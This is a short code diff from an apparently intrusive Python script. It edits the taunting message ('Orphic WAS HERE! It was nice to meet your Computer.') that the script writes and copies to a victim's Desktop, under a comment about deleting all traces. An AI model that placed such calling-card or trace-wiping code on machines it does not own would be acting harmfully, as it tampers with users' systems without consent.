@@ -78,7 +78,7 @@ def __main__():
         #Delete all Traces and leave a Message.
         desktop = os.getenv('DESKTOP')
         payload = open("HEY.txt", "w")
-        payload.write("Orphic WAS HERE! It was nice to meet your Computer.\n-FAST Corporation.")
+        payload.write("Orphic WAS HERE! It was nice to meet your Computer.")
         payload.close()
         desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') 
         os.system("copy HEY.txt "+desktop)
